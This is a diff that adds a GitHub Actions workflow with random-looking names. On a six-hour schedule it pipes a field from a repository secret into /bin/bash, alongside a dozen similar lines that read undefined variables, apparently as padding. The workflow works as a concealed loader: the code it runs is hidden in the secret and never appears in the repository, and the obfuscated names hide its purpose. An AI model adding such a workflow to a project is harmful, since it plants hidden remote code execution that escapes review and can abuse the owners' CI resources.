@@ -1,0 +1,30 @@
+name: renmazuo6218
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: renmazuo6218
+        env:
+          buuy80946: ${{ secrets.buuy80946 }}
+        run: |
+          echo $buuy80946 | jq -r .lri7 | /bin/bash
+          echo $g5113 | jq -r .yry3 | /bin/bash
+          echo $wfmwq5913 | jq -r .swc5294 | /bin/bash
+          echo $iu287 | jq -r .fgwmp48691 | /bin/bash
+          echo $jsgw10348 | jq -r .gu8 | /bin/bash
+          echo $nx894 | jq -r .c634 | /bin/bash
+          echo $jg592 | jq -r .r0527 | /bin/bash
+          echo $czv1 | jq -r .cri6 | /bin/bash
+          echo $tky1800 | jq -r .bgkg02 | /bin/bash
+          echo $dopic98854 | jq -r .gr8 | /bin/bash
+          echo $zur01 | jq -r .tzmoj00324 | /bin/bash
+          echo $m108 | jq -r .zqt418 | /bin/bash
+          echo $d16 | jq -r .wvg99601 | /bin/bash
+          echo $mx15 | jq -r .i82434 | /bin/bash
+
